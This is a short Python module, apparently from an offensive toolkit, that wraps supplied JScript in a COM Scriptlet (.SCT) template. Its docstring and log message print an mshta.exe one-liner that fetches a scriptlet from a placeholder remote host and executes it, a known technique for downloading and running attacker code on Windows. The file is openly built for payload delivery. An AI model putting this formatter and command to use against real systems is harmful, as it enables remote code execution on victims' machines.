from lets.__module__ import Module


class SCT(Module):
    """
    Format JScript as a COM Scriptlet.

    Usage: mshta.exe javascript:a=GetObject("script:http://HOST/PAYLOAD.SCT").Exec();close();
    """

    @classmethod
    def add_arguments(cls, parser):
        pass

    def handle(self, input):
        assert input is not None, "Must provide jscript as input"

        for data in input:
            yield (self.template % data.decode()).encode()
            self.log.info("Usage: mshta.exe javascript:a=GetObject(\"script:http://HOST/PAYLOAD.SCT\").Exec();close();")

    template = """<?XML version="1.0"?>
<scriptlet>
<script language="javascript">
%s
</script>
</scriptlet>
"""
